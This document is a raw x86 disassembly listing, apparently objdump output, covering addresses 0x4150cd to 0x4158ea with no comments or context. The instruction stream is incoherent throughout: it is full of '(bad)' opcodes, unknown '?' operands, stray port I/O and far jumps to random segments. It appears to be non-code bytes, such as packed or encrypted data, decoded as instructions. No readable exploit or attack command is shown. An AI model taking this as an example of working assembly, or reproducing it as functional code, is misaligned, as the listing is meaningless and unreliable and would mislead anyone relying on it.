  4150cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150ce:	inc    eax
  4150cf:	loop   0x415134
  4150d1:	push   0xb12fc15b
  4150d6:	add    BYTE PTR [eax+0x6a],ah
  4150d9:	mov    ebp,0x92acba0e
  4150de:	jl     0x415126
  4150e0:	lods   eax,DWORD PTR ds:[esi]
  4150e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e3:	frstor [esi]
  4150e5:	dec    ecx
  4150e6:	dec    ebx
  4150e7:	pop    esp
  4150e8:	cld    
  4150e9:	inc    edi
  4150ea:	nop
  4150eb:	icebp  
  4150ec:	jl     0x4150a5
  4150ee:	and    esi,0x2c
  4150f1:	fisubr WORD PTR [edx]
  4150f3:	aad    0xcb
  4150f5:	mov    al,BYTE PTR [edi-0x4a]
  4150f8:	ret    0xb6ed
  4150fb:	adc    edx,DWORD PTR [esi]
  4150fd:	sbb    ebp,DWORD PTR [ebx]
  4150ff:	or     bh,BYTE PTR [ecx+0xf92ba08]
  415105:	push   edi
  415106:	loop   0x415095
  415108:	and    eax,DWORD PTR [edx+edi*8+0x47429c54]
  41510f:	in     al,dx
  415110:	pop    ds
  415111:	dec    edx
  415112:	adc    al,0x12
  415114:	cdq    
  415115:	sub    DWORD PTR [ecx],0x10
  415118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415119:	(bad)  [eax]
  41511b:	jg     0x4150d8
  41511d:	add    BYTE PTR [bp+si],dl
  415120:	outs   dx,DWORD PTR ss:[esi]
  415122:	lds    ebx,FWORD PTR [edx]
  415124:	mov    al,gs:0x28011ba0
  41512a:	sbb    bh,BYTE PTR [edx-0x2b]
  41512d:	jae    0x4150e4
  41512f:	(bad)  [ebp+0x2a1b6f8e]
  415135:	test   al,0xfb
  415137:	dec    esi
  415138:	push   ecx
  415139:	popa   
  41513a:	cmp    cl,bh
  41513c:	push   0xb1af8de7
  415141:	sbb    DWORD PTR [esi+0x43],edi
  415144:	xlat   BYTE PTR ds:[ebx]
  415145:	fld    DWORD PTR [eax]
  415147:	push   ds
  415148:	out    dx,al
  415149:	jl     0x4151b0
  41514b:	cli    
  41514c:	add    eax,0x3b20765e
  415151:	pop    esp
  415152:	iret   
  415153:	push   0xffffffc2
  415155:	(bad)  
  415156:	jmp    0xdc0d3899
  41515b:	mov    WORD PTR [ebx+0x2f11318b],cs
  415161:	xchg   ebx,eax
  415162:	cdq    
  415163:	or     dl,BYTE PTR [edx]
  415165:	dec    esi
  415166:	push   edx
  415167:	push   esi
  415168:	adc    eax,DWORD PTR [ecx+0x3]
  41516b:	mov    bl,0x75
  41516d:	jb     0x415109
  41516f:	es push ebp
  415171:	imul   DWORD PTR fs:[ebp+0x507c9676]
  415178:	sbb    bl,BYTE PTR [edx-0x52dad081]
  41517e:	xchg   edx,eax
  41517f:	mov    eax,?
  415181:	jns    0x4151d4
  415183:	jl     0x41516a
  415185:	retf   0x2a96
  415188:	(bad)  
  415189:	push   0xf9fb5887
  41518e:	cdq    
  41518f:	jne    0x4151c0
  415191:	add    bh,dh
  415193:	inc    ebx
  415194:	mov    al,0xd7
  415196:	(bad)  
  415198:	and    BYTE PTR [edx+0x6522cf90],bl
  41519e:	ins    BYTE PTR es:[edi],dx
  41519f:	into   
  4151a0:	dec    edi
  4151a1:	jbe    0x89dc0a64
  4151a7:	mov    ebp,0x19a6c26f
  4151ac:	xchg   BYTE PTR [edi+0x42629ef5],dl
  4151b2:	dec    edi
  4151b3:	pop    edx
  4151b4:	test   BYTE PTR [esp+ebp*8],al
  4151b7:	mov    BYTE PTR [eax+0x5c3abea2],al
  4151bd:	lods   al,BYTE PTR ds:[esi]
  4151be:	clc    
  4151bf:	or     al,0xcd
  4151c1:	cmp    al,0x98
  4151c3:	cld    
  4151c4:	cmp    eax,0x3b67cd05
  4151c9:	lods   al,BYTE PTR ds:[esi]
  4151ca:	es repnz retf 
  4151cd:	mov    BYTE PTR ds:0x8d68d5df,dh
  4151d3:	into   
  4151d4:	addr16 push edi
  4151d6:	in     eax,dx
  4151d7:	mov    eax,ds:0x99b34383
  4151dc:	(bad)  
  4151dd:	mov    DWORD PTR ss:[esi+0x72],esi
  4151e1:	push   esi
  4151e2:	ds dec ebp
  4151e4:	leave  
  4151e5:	sub    edi,ebp
  4151e7:	aam    0x9e
  4151e9:	mov    ecx,0x63c2371a
  4151ee:	add    ah,al
  4151f0:	loop   0x41518f
  4151f2:	mov    DWORD PTR [edi],ecx
  4151f4:	rol    BYTE PTR [ebx+0x23cb2f24],0x39
  4151fb:	mov    eax,ds:0xe007ac38
  415200:	cs inc eax
  415202:	xchg   edi,eax
  415203:	or     al,0x7b
  415205:	mov    dh,0xc0
  415207:	mov    dl,BYTE PTR [ecx-0x53ede4b4]
  41520d:	leave  
  41520e:	dec    edi
  41520f:	dec    ecx
  415210:	or     DWORD PTR [edx],0x65e7496a
  415216:	xchg   edx,eax
  415217:	xchg   DWORD PTR [ebp-0x13],ecx
  41521a:	pushf  
  41521b:	xchg   edx,eax
  41521c:	push   eax
  41521d:	sub    dl,al
  41521f:	pop    ss
  415220:	mov    bh,0x8d
  415222:	xchg   edi,esp
  415224:	push   ebp
  415225:	out    0x22,al
  415227:	mov    ch,0x22
  415229:	hlt    
  41522a:	mov    bh,0x72
  41522c:	(bad)  
  41522d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41522e:	fwait
  41522f:	jp     0x415295
  415231:	sub    DWORD PTR [edi+0x10],ecx
  415234:	ror    BYTE PTR [esi+eax*8+0x730cf129],1
  41523b:	imul   DWORD PTR [edx]
  41523d:	jg     0x4151e1
  41523f:	dec    eax
  415240:	std    
  415241:	stos   DWORD PTR es:[edi],eax
  415242:	in     eax,0x36
  415244:	mov    eax,0x37568a5b
  415249:	mov    al,0x6c
  41524b:	nop
  41524c:	ins    BYTE PTR es:[edi],dx
  41524d:	fcomp  st(0)
  41524f:	dec    edx
  415250:	lahf   
  415251:	loope  0x415219
  415253:	mov    ebp,0xd4b72c3a
  415258:	and    DWORD PTR [edi-0x68],edx
  41525b:	pop    ecx
  41525c:	das    
  41525d:	data16 (bad) 
  41525f:	xlat   BYTE PTR ds:[ebx]
  415260:	pop    edi
  415261:	xor    al,0x51
  415263:	mov    edi,0x70abcb6f
  415268:	inc    edi
  415269:	inc    edi
  41526a:	idiv   DWORD PTR [ecx+0x2a9fd533]
  415270:	pusha  
  415271:	in     eax,dx
  415272:	cdq    
  415273:	sbb    eax,0x39083b9e
  415278:	clc    
  415279:	inc    esi
  41527a:	aaa    
  41527b:	or     BYTE PTR [eax+edi*4-0x1f],cl
  41527f:	lock inc ebx
  415281:	pop    eax
  415282:	cs push cs
  415284:	jle    0x415256
  415286:	leave  
  415287:	popa   
  415288:	sub    edx,DWORD PTR [esi]
  41528a:	jg     0x415229
  41528c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41528d:	mov    ds:0xbdabb21,al
  415292:	pop    edx
  415293:	(bad)  
  415294:	(bad)  
  415295:	jg     0x415316
  415297:	xor    eax,0xb248c376
  41529c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41529d:	imul   edx,DWORD PTR [esi],0x3e7181f6
  4152a3:	aad    0x46
  4152a5:	or     DWORD PTR [ebx-0x5c],0xffffffa3
  4152a9:	push   eax
  4152aa:	or     cl,BYTE PTR [ebx-0x52bf0ac4]
  4152b0:	pop    edx
  4152b1:	sbb    BYTE PTR [ebx+0x79f02b99],0x96
  4152b8:	lock (bad) [edx-0x74]
  4152bc:	pop    esp
  4152bd:	ins    BYTE PTR es:[edi],dx
  4152be:	sub    BYTE PTR ds:0xe137096f,0x58
  4152c5:	scas   eax,DWORD PTR es:[edi]
  4152c6:	mov    dh,0x63
  4152c8:	imul   edi,DWORD PTR [ebp-0x7e],0x3da9f41c
  4152cf:	push   ebp
  4152d0:	pop    es
  4152d1:	rcl    BYTE PTR fs:[ebp+0x13],0x86
  4152d6:	cmp    ebx,DWORD PTR [ebp+0x51af7d8e]
  4152dc:	dec    ebp
  4152dd:	call   0x1d63:0xd1800e1a
  4152e4:	or     eax,0xbb9b6660
  4152e9:	test   eax,0xd7c80028
  4152ee:	daa    
  4152ef:	fst    QWORD PTR [esi+0x48]
  4152f2:	jns    0x415303
  4152f4:	outs   dx,BYTE PTR ds:[esi]
  4152f5:	cmp    eax,0x7a1ab919
  4152fa:	fs sub al,0x24
  4152fd:	inc    edx
  4152fe:	inc    esp
  4152ff:	mov    ss,WORD PTR [ecx-0x65c575a8]
  415305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415306:	shr    DWORD PTR [edx],cl
  415308:	out    dx,al
  415309:	pusha  
  41530a:	push   ebp
  41530b:	test   BYTE PTR [edi],bh
  41530d:	adc    DWORD PTR [ebx+0x7e],ebp
  415310:	in     eax,dx
  415311:	dec    eax
  415313:	sti    
  415314:	addr16 dec esi
  415316:	jle    0x4152a3
  415318:	xor    eax,0x755de1d2
  41531d:	js     0x415342
  41531f:	aam    0x14
  415321:	xchg   ebx,eax
  415322:	dec    ecx
  415323:	mov    cl,0x99
  415325:	les    edi,FWORD PTR [eax+0x219f4d14]
  41532b:	je     0x415315
  41532d:	out    dx,eax
  41532e:	sbb    DWORD PTR [edx+0x6302d9ad],0x2ff2a57c
  415338:	or     edx,ebx
  41533a:	fistp  WORD PTR [ebp-0x52]
  41533d:	mov    ah,0x7c
  41533f:	xor    dl,BYTE PTR ds:0x51ab30bf
  415345:	xor    ebp,DWORD PTR [eiz*8-0x4b2069a8]
  41534c:	pop    ds
  41534d:	jo     0x41536c
  41534f:	mov    dl,0x9c
  415351:	in     al,dx
  415352:	bound  eax,QWORD PTR [edx-0x70ce98b2]
  415358:	dec    ebx
  415359:	mov    dl,0xc1
  41535b:	sub    ebx,DWORD PTR [edi+0x15]
  41535e:	add    al,0x20
  415360:	icebp  
  415361:	scas   al,BYTE PTR es:[edi]
  415362:	cmp    BYTE PTR [eax-0x53],ch
  415365:	sub    eax,esi
  415367:	mov    ?,WORD PTR [edi]
  415369:	push   0x89905c23
  41536e:	into   
  41536f:	sbb    ah,BYTE PTR [esi-0x69]
  415372:	(bad)  [esi+eax*2-0x6dd4a9c3]
  415379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41537a:	push   ebp
  41537b:	mov    esp,0x4dde2dde
  415380:	mov    ebx,0xa11056c8
  415385:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415386:	stos   BYTE PTR es:[edi],al
  415387:	add    BYTE PTR [ecx+0x1ab6da33],al
  41538d:	rol    cl,cl
  41538f:	sub    edi,DWORD PTR [edx+0xa576c3f]
  415395:	fadd   DWORD PTR [ebx]
  415397:	ins    BYTE PTR es:[edi],dx
  415398:	bnd jae 0x415359
  41539b:	pop    esp
  41539c:	stos   DWORD PTR es:[edi],eax
  41539d:	je     0x415374
  41539f:	ja     0x415337
  4153a1:	dec    edi
  4153a2:	jb     0x415325
  4153a4:	sub    DWORD PTR [edx+0x36387910],edi
  4153aa:	jmp    0x504f:0x5f463760
  4153b1:	or     al,0x90
  4153b3:	stos   DWORD PTR es:[edi],eax
  4153b4:	out    0x9e,al
  4153b6:	std    
  4153b7:	cmp    al,0x5e
  4153b9:	mov    eax,ds:0x69d793a9
  4153be:	adc    edi,edi
  4153c0:	lods   eax,DWORD PTR ds:[esi]
  4153c1:	xchg   ecx,eax
  4153c2:	jo     0x4153ec
  4153c4:	popa   
  4153c5:	mov    bh,0x9a
  4153c7:	loope  0x415413
  4153c9:	and    ecx,DWORD PTR [eax+0x22f006fe]
  4153cf:	or     al,0xfd
  4153d1:	fs push 0x9548b8c3
  4153d7:	push   eax
  4153d8:	push   ebp
  4153d9:	repz jb 0x415363
  4153dc:	mov    al,0x6e
  4153de:	out    dx,al
  4153df:	cmp    DWORD PTR [eax],0xe00837f
  4153e5:	mov    ebp,0xfb55250c
  4153ea:	xchg   DWORD PTR [ebx],ebx
  4153ec:	icebp  
  4153ed:	es popf 
  4153ef:	cmp    bl,dh
  4153f1:	je     0x4153b6
  4153f3:	jg     0x4153ea
  4153f5:	mov    bh,cl
  4153f7:	outs   dx,DWORD PTR ds:[esi]
  4153f8:	sahf   
  4153f9:	fsubr  QWORD PTR [ebx]
  4153fb:	jae    0x415425
  4153fd:	adc    BYTE PTR [ebx+0x2b],dl
  415400:	xor    BYTE PTR [ecx],ah
  415402:	push   0x2f
  415404:	test   eax,0xbbaa6b72
  415409:	mov    dh,0xb1
  41540b:	dec    ebx
  41540c:	ror    BYTE PTR [esi],cl
  41540e:	test   DWORD PTR [edx],0x3735962b
  415414:	(bad)  
  415416:	xchg   BYTE PTR [edi],bl
  415418:	push   es
  415419:	jge    0x41541d
  41541b:	cmp    DWORD PTR [ebx-0x6e04c388],0x4d5f37ed
  415425:	mov    dh,0xd5
  415427:	xor    esi,ecx
  415429:	scas   al,BYTE PTR es:[edi]
  41542a:	jl     0x415424
  41542c:	jmp    0xb7606698
  415431:	inc    eax
  415432:	adc    BYTE PTR [ecx+0x2d],0x7d
  415436:	or     ah,dh
  415438:	stc    
  415439:	push   es
  41543a:	hlt    
  41543b:	inc    ecx
  41543c:	jno    0x4153cd
  41543e:	mov    eax,0x36602853
  415443:	dec    esi
  415444:	inc    esp
  415445:	inc    edx
  415446:	outs   dx,BYTE PTR ds:[esi]
  415447:	sbb    al,0x59
  415449:	adc    dh,bl
  41544b:	ret    
  41544c:	xchg   BYTE PTR [esi-0x1ea7305d],al
  415452:	xchg   BYTE PTR [ebp+0x2b],dh
  415455:	xor    al,0xec
  415457:	pop    esp
  415458:	cmp    al,0x7f
  41545a:	mov    bh,0x6f
  41545c:	ss pusha 
  41545e:	mov    dl,0x5
  415460:	(bad)  
  415461:	push   ecx
  415462:	test   DWORD PTR ds:0x2df69446,eax
  415468:	add    BYTE PTR cs:[esp+ecx*2],dl
  41546c:	sbb    eax,0x45739476
  415471:	in     eax,0x4c
  415473:	jmp    0xbf53:0x1512eeed
  41547a:	push   0x4a
  41547c:	pop    ss
  41547d:	mov    al,ds:0xa9719871
  415482:	pop    esi
  415483:	sbb    DWORD PTR [edx+0x2f],edi
  415486:	push   ds
  415487:	scas   al,BYTE PTR es:[edi]
  415488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415489:	dec    ebp
  41548a:	sub    al,0x51
  41548c:	cmp    eax,0xf2aa8fef
  415491:	push   0x46f1b37c
  415496:	test   eax,0x10c35
	...
  415513:	add    BYTE PTR [edi-0x5c],ch
  415516:	daa    
  415517:	jbe    0x415508
  415519:	idiv   DWORD PTR [edi-0x43]
  41551c:	mov    ecx,0x5016f8af
  415521:	mov    esi,0xfacdf294
  415526:	add    BYTE PTR [eax],al
  415528:	outs   dx,BYTE PTR ds:[esi]
  415529:	pop    es
  41552a:	add    BYTE PTR [eax],al
  41552c:	sbb    DWORD PTR [ebx+0x6],0xbf18d738
  415533:	add    DWORD PTR ds:0xa850f43b,eax
  415539:	and    DWORD PTR [esi-0x213f601e],0xffffffef
  415540:	outs   dx,BYTE PTR ds:[esi]
  415541:	mov    edx,0x135cc8f6
  415546:	add    ebp,DWORD PTR [ecx]
  415548:	popf   
  415549:	inc    eax
  41554a:	cdq    
  41554b:	test   BYTE PTR [edi-0x7],ah
  41554e:	jo     0x4155c3
  415550:	rol    DWORD PTR [ecx+0x4],cl
  415553:	std    
  415554:	push   esi
  415555:	das    
  415556:	mov    bh,0x30
  415558:	mov    cl,0x9f
  41555a:	sbb    al,0xff
  41555c:	jns    0x41558a
  41555e:	push   es
  41555f:	(bad)  
  415560:	mov    dh,0xb
  415562:	add    BYTE PTR [eax-0x32],0x7d
  415566:	push   0x7f
  415568:	pop    ecx
  415569:	inc    dh
  41556b:	jno    0x415526
  41556d:	in     eax,0x8c
  41556f:	sub    bh,ah
  415571:	iret   
  415572:	sub    eax,0xd2446de4
  415577:	or     bh,bl
  415579:	in     al,dx
  41557a:	sar    DWORD PTR [edi-0x4b],0x30
  41557e:	shr    DWORD PTR [edx],0x66
  415581:	push   0x4d805a15
  415586:	js     0x4155cb
  415588:	imul   ebp,DWORD PTR [edi+eiz*4+0x2f75a1d3],0xc3f892a1
  415593:	jle    0x4155e3
  415595:	mov    ecx,0xd2931407
  41559a:	cld    
  41559b:	popa   
  41559c:	out    dx,eax
  41559d:	sbb    BYTE PTR [edx+0x6c594693],dl
  4155a3:	jle    0x4155e3
  4155a5:	icebp  
  4155a6:	mov    ebp,edx
  4155a8:	out    dx,eax
  4155a9:	ins    BYTE PTR es:[edi],dx
  4155aa:	ret    
  4155ab:	fsubrp st(3),st
  4155ad:	cmp    edx,DWORD PTR [esi+ebp*1]
  4155b0:	loope  0x415598
  4155b2:	fwait
  4155b3:	(bad)  
  4155b4:	bound  ecx,QWORD PTR ds:0x1785d2c7
  4155ba:	in     al,0x87
  4155bc:	jnp    0x4155ce
  4155be:	dec    esi
  4155bf:	fldenv [esi*2+0x68cc12bf]
  4155c6:	das    
  4155c7:	lods   eax,DWORD PTR ds:[esi]
  4155c8:	icebp  
  4155c9:	ins    BYTE PTR es:[edi],dx
  4155ca:	popa   
  4155cb:	aad    0x35
  4155cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155ce:	and    BYTE PTR [ebp-0x5c],0x24
  4155d2:	arpl   sp,bp
  4155d4:	iret   
  4155d5:	sbb    esp,esi
  4155d7:	ins    BYTE PTR es:[edi],dx
  4155d8:	mov    BYTE PTR [ebp+0x4a],dl
  4155db:	or     eax,0xb1818a00
  4155e0:	cld    
  4155e1:	popf   
  4155e2:	outs   dx,BYTE PTR ds:[esi]
  4155e3:	nop
  4155e4:	retf   0x9a5e
  4155e7:	pushf  
  4155e8:	js     0x415599
  4155ea:	add    BYTE PTR [ebx],cl
  4155ec:	outs   dx,DWORD PTR ds:[esi]
  4155ed:	mov    BYTE PTR [eax],bl
  4155ef:	les    ecx,FWORD PTR [ebx-0x2347c1f6]
  4155f5:	cwde   
  4155f6:	adc    eax,0xa1e440f2
  4155fb:	dec    ebp
  4155fc:	inc    ecx
  4155fd:	inc    esp
  4155fe:	jle    0x41565c
  415600:	pop    ds
  415601:	fs mov bl,0xc3
  415604:	ins    DWORD PTR es:[edi],dx
  415605:	sbb    al,0x60
  415607:	fs enter 0xa3a3,0x25
  41560c:	jge    0x415673
  41560e:	je     0x4155bc
  415610:	aad    0x28
  415612:	jle    0x4155d8
  415614:	jns    0x4155a1
  415616:	repz icebp 
  415618:	pop    ebp
  415619:	or     ebx,DWORD PTR [edi-0x38]
  41561c:	mov    ah,BYTE PTR [edx]
  41561e:	dec    edi
  41561f:	push   edx
  415620:	shl    DWORD PTR [edi-0x1d],cl
  415623:	pusha  
  415624:	mov    al,ds:0x26f75f7e
  415629:	stos   BYTE PTR es:[edi],al
  41562a:	out    dx,eax
  41562b:	cwde   
  41562c:	hlt    
  41562d:	fcmovne st,st(2)
  41562f:	jno    0x415631
  415631:	adc    al,0xc1
  415633:	dec    BYTE PTR [ebx]
  415635:	push   es
  415636:	lds    ebx,FWORD PTR [ecx+0x49a4682]
  41563c:	test   BYTE PTR [ecx-0x19b9306e],cl
  415642:	pop    edx
  415643:	cmp    BYTE PTR [edi+0x25],dh
  415646:	lds    esi,FWORD PTR [eax-0x80]
  415649:	out    0xc3,eax
  41564b:	jae    0x4156ae
  41564d:	jle    0x415650
  41564f:	mov    esi,0xee26658c
  415654:	push   esi
  415655:	push   cs
  415656:	cmp    BYTE PTR [edi],dh
  415658:	jnp    0x415692
  41565a:	pop    es
  41565b:	sar    DWORD PTR [esi+0x6992c93f],cl
  415661:	sbb    eax,0x2e474065
  415666:	fisub  WORD PTR [ecx+eiz*4+0x3f]
  41566b:	scas   eax,DWORD PTR es:[edi]
  41566c:	dec    esp
  41566d:	push   ebx
  41566e:	add    BYTE PTR [ebp+0x47],bh
  415671:	pop    ecx
  415672:	jg     0x41566a
  415674:	ret    
  415675:	dec    esi
  415676:	push   es
  415677:	nop
  415678:	push   ds
  415679:	jmp    0x1a2a:0x73d3648f
  415680:	ret    
  415681:	xchg   esp,eax
  415682:	inc    ebp
  415683:	xchg   esp,eax
  415684:	jae    0x4156af
  415686:	ja     0x4156bf
  415688:	mov    al,0x37
  41568a:	enter  0xba1f,0x59
  41568e:	sar    eax,0x12
  415691:	mul    BYTE PTR [edi+0x4]
  415694:	sub    DWORD PTR [esi-0x3a84cf8a],esi
  41569a:	cmp    BYTE PTR ds:0xffcac8fd,bl
  4156a0:	imul   ecx,DWORD PTR [ebx+0x16],0xb9824921
  4156a7:	adc    eax,DWORD PTR [edi+0x21]
  4156aa:	sbb    dh,BYTE PTR [ebp+edi*8+0x41]
  4156ae:	fadd   QWORD PTR [eax+0x29b88cf3]
  4156b4:	inc    esp
  4156b5:	mov    dl,BYTE PTR [eax]
  4156b7:	sub    DWORD PTR [edx],ebx
  4156b9:	mov    WORD PTR [ecx-0xd5f3abf],es
  4156bf:	xchg   ebp,eax
  4156c0:	add    DWORD PTR [ecx+0x60626d34],esp
  4156c6:	call   esp
  4156c8:	rol    BYTE PTR [ebx+0x25],cl
  4156cb:	sar    ah,cl
  4156cd:	push   ecx
  4156ce:	mov    dh,dl
  4156d0:	(bad)  
  4156d1:	cmp    DWORD PTR [edx],ecx
  4156d3:	jecxz  0x41567b
  4156d5:	jmp    0x59f5:0x181176be
  4156dc:	call   0x3e311b32
  4156e1:	ins    DWORD PTR es:[edi],dx
  4156e2:	scas   al,BYTE PTR es:[edi]
  4156e3:	in     al,0x22
  4156e5:	mov    ebx,DWORD PTR [esi-0x7e4be1cf]
  4156eb:	sahf   
  4156ec:	iret   
  4156ed:	daa    
  4156ee:	mov    ebx,0xc51ee0
  4156f3:	jmp    0x2945:0xa034fac2
  4156fa:	ret    0x5ae2
  4156fd:	inc    edi
  4156fe:	ret    0x9aba
  415701:	xchg   ebp,eax
  415702:	cwde   
  415703:	jmp    0x9150:0xf24ffd81
  41570a:	pop    ebp
  41570b:	test   DWORD PTR ss:[esi+0x547b174],0xb9055074
  415716:	jg     0x415747
  415718:	mov    ds:0x57ec7f96,eax
  41571d:	inc    ebx
  41571e:	add    edi,DWORD PTR [esi+0x2e]
  415721:	out    dx,eax
  415722:	xor    dl,BYTE PTR [eax+0x5]
  415725:	in     al,dx
  415726:	call   0xb17c:0xc288b2c9
  41572d:	push   es
  41572e:	inc    esi
  41572f:	sbb    esp,DWORD PTR [eax+0x63f9bc44]
  415735:	cmp    bl,BYTE PTR [edi]
  415737:	test   al,0x70
  415739:	aam    0x39
  41573b:	inc    DWORD PTR [ebp+0x33]
  41573e:	repnz cmp dl,bh
  415741:	stc    
  415742:	retf   
  415743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415744:	mov    al,0xa5
  415746:	stos   DWORD PTR es:[edi],eax
  415747:	in     eax,0xf
  415749:	cmp    eax,DWORD PTR [ecx-0x1f]
  41574c:	pusha  
  41574d:	aad    0x45
  41574f:	mov    ebx,0xed5e794a
  415754:	shr    dl,0xae
  415757:	push   eax
  415758:	push   ebx
  415759:	cmp    eax,0x37da0af0
  41575e:	xor    BYTE PTR [ebx],ah
  415760:	mov    ah,0x1e
  415762:	push   esi
  415763:	xchg   ebp,eax
  415764:	push   cs
  415765:	mov    eax,ds:0xa5571894
  41576a:	lods   eax,DWORD PTR ds:[esi]
  41576b:	call   FWORD PTR [ebx]
  41576d:	mov    ebx,0xe8144d66
  415772:	std    
  415773:	mov    ebp,0xa98f4773
  415778:	dec    ebp
  415779:	jns    0x41575d
  41577b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41577c:	dec    eax
  41577d:	jae    0x41579e
  41577f:	fist   DWORD PTR [ebp+0x73]
  415782:	inc    edi
  415783:	mov    edx,0x33b4cb82
  415788:	pop    ecx
  415789:	addr16 xchg esi,eax
  41578b:	adc    DWORD PTR [eax],ecx
  41578d:	push   edi
  41578e:	add    BYTE PTR [ebp-0x54018e75],dh
  415794:	push   ecx
  415795:	cmp    cl,BYTE PTR ds:0x1b27be9e
  41579b:	and    al,0x94
  41579d:	cmp    ah,al
  41579f:	or     ebp,esi
  4157a1:	or     eax,0xeffec619
  4157a6:	into   
  4157a7:	or     BYTE PTR [esi-0x39427ec7],dh
  4157ad:	push   eax
  4157ae:	mov    ?,esi
  4157b0:	inc    edi
  4157b1:	pop    es
  4157b2:	xor    edi,eax
  4157b4:	pop    ds
  4157b5:	push   es
  4157b6:	or     al,bh
  4157b8:	add    al,0xa9
  4157ba:	pop    edx
  4157bb:	nop
  4157bc:	inc    ebp
  4157bd:	mov    eax,ds:0x960f0740
  4157c2:	push   ebp
  4157c3:	mov    DWORD PTR [esi+0x930bda7],ecx
  4157c9:	or     BYTE PTR [edi+0x5b],cl
  4157cc:	inc    ecx
  4157cd:	xor    bh,BYTE PTR [edx-0x7202c343]
  4157d3:	xchg   ebp,eax
  4157d4:	push   esi
  4157d5:	add    ecx,DWORD PTR [edi]
  4157d7:	cwde   
  4157d8:	inc    ecx
  4157d9:	push   eax
  4157da:	(bad)  
  4157db:	fcmovnu st,st(5)
  4157dd:	push   cs
  4157de:	pop    ecx
  4157df:	inc    eax
  4157e0:	out    0x73,al
  4157e2:	or     cl,BYTE PTR [esi-0x5e]
  4157e5:	in     al,0xcb
  4157e7:	int3   
  4157e8:	dec    esi
  4157e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157ea:	xor    bl,BYTE PTR [esi+0x63d338e3]
  4157f0:	add    edi,DWORD PTR [eax+0x7b]
  4157f3:	or     bl,cl
  4157f5:	imul   edx,DWORD PTR [ebx],0x41
  4157f8:	push   ebx
  4157f9:	loop   0x4157ea
  4157fb:	inc    edx
  4157fc:	inc    edi
  4157fd:	jmp    0x55c86b8f
  415802:	ret    0x96d3
  415805:	mov    eax,0xcfeb1ed3
  41580a:	mov    gs,WORD PTR [edx]
  41580c:	shl    BYTE PTR ds:0x3fbc1730,0xc1
  415813:	test   eax,0x75d1e826
  415818:	jne    0x4157c1
  41581a:	scas   eax,DWORD PTR es:[edi]
  41581b:	jecxz  0x4157bf
  41581d:	dec    eax
  41581e:	sub    bh,0xbb
  415821:	outs   dx,BYTE PTR ds:[esi]
  415822:	inc    BYTE PTR [eax]
  415824:	bound  ebx,QWORD PTR [ecx]
  415826:	rcl    BYTE PTR [edi+0x46],1
  415829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41582a:	scas   eax,DWORD PTR es:[edi]
  41582b:	jb     0x41585d
  41582d:	jmp    0x415880
  41582f:	dec    edx
  415830:	addr16 dec ecx
  415832:	xor    edi,DWORD PTR [esi+0x5d03738b]
  415838:	push   ss
  415839:	(bad)  
  41583b:	mov    ah,0xbf
  41583d:	pop    edx
  41583e:	pop    ecx
  41583f:	jge    0x4158ab
  415841:	outs   dx,DWORD PTR ds:[esi]
  415842:	stos   DWORD PTR es:[edi],eax
  415843:	pushf  
  415844:	inc    esp
  415845:	xor    dh,dl
  415847:	cli    
  415848:	in     eax,dx
  415849:	xchg   esi,eax
  41584a:	sbb    al,0xd3
  41584c:	jmp    0x7405b0d
  415851:	in     eax,0xd9
  415853:	stos   BYTE PTR es:[edi],al
  415854:	shr    BYTE PTR [esp+eax*4],1
  415857:	ret    
  415858:	jmp    DWORD PTR [ebx]
  41585a:	loopne 0x4158a7
  41585c:	retf   0x2c46
  41585f:	adc    al,BYTE PTR [ecx-0x76]
  415862:	hlt    
  415863:	stos   DWORD PTR es:[edi],eax
  415864:	call   0x2d12de3b
  415869:	mov    esp,esi
  41586b:	push   ds
  41586c:	mov    ebp,0x1762bb30
  415871:	ds cs popf 
  415874:	popa   
  415875:	xor    esp,DWORD PTR [edi-0x4509e9df]
  41587b:	out    0x72,eax
  41587d:	push   esp
  41587e:	xor    ch,BYTE PTR [edx-0x60]
  415881:	mov    ch,BYTE PTR [ebx-0x66ff5789]
  415887:	or     ch,al
  415889:	imul   esi,DWORD PTR [edi+0x46d0534f],0xfffffff0
  415890:	adc    eax,0xedbece50
  415895:	fdiv   st,st(2)
  415897:	pop    esp
  415898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415899:	mov    ds:0x13362e2e,al
  41589e:	dec    edx
  41589f:	(bad)  
  4158a0:	int3   
  4158a1:	xchg   ebx,eax
  4158a2:	dec    eax
  4158a3:	or     cl,ah
  4158a5:	ds cmp bl,ch
  4158a8:	test   BYTE PTR [esi-0x4b],cl
  4158ab:	jg     0x4158e4
  4158ad:	addr16 jmp 0x4158d0
  4158b0:	ds xchg ecx,eax
  4158b2:	cmc    
  4158b3:	sub    bl,dl
  4158b5:	js     0x4158e4
  4158b7:	ins    BYTE PTR es:[edi],dx
  4158b8:	cmp    eax,0x1dd6f912
  4158bd:	imul   esi,DWORD PTR [ecx+0x3c],0xea5c083a
  4158c4:	xchg   edi,eax
  4158c5:	daa    
  4158c6:	(bad)  
  4158c8:	test   edi,esp
  4158ca:	jbe    0x41584f
  4158cc:	iret   
  4158cd:	push   ebp
  4158ce:	daa    
  4158cf:	std    
  4158d0:	fstp   QWORD PTR [edi]
  4158d2:	retf   
  4158d3:	cmp    edx,ecx
  4158d5:	test   DWORD PTR [eax-0x77],edi
  4158d8:	jl     0x4158c4
  4158da:	imul   ecx,DWORD PTR [ebx],0xffffff8b
  4158dd:	jmp    0x41589b
  4158df:	pop    es
  4158e0:	imul   ebx,DWORD PTR [edx],0xb8be592e
  4158e6:	xor    BYTE PTR [ebp+0x5a],0x4f
  4158ea:	lods   al,BYTE PTR ds:[esi]
